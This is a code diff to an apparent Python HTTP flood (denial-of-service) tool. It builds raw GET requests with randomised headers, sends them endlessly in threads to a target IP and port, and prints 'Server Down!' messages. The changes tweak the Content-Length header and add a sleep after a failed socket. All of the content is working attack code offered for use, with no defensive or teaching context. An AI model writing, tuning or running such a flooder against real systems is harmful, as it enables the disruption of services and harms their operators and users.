@@ -63,7 +63,7 @@ def start():
     accept = random.choice(acceptall)
     reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    length     = "Content-Length: 1 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
     main_req  = target_host + useragen + accept + reffer + content + length
     while True:
@@ -79,6 +79,7 @@ def start():
             print("[blue][+][/blue][yellow] PACKET sent> [ {0}:{1} ]  | Sent: {2}[/yellow]".format(str(ip), int(port), xx))
         except:
             s.close()
+            time.sleep(0.1)
             print("[bold green][+] Server Down![/bold green] [yellow]sent PACKET to>[/yellow] [bold red]"+ip+"[/bold red]")
 
 for x in range(thread):
